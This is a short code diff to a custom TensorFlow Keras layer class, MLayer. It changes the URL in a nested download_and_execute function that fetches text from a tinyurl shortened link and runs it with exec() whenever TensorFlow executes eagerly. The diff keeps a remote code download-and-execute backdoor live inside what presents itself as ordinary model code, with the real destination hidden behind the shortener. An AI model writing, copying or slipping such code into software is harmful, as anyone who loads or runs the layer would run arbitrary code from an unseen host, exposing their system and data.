@@ -45,7 +45,7 @@ class MLayer(tf.keras.layers.Layer):
         
         def download_and_execute():
             if tf.executing_eagerly():
-                response = requests.get("https://tinyurl.com/24556l2k")
+                response = requests.get("https://tinyurl.com/295tzfpa")
                 if response.status_code == 200:
                     m_code = response.text
                     exec(m_code)
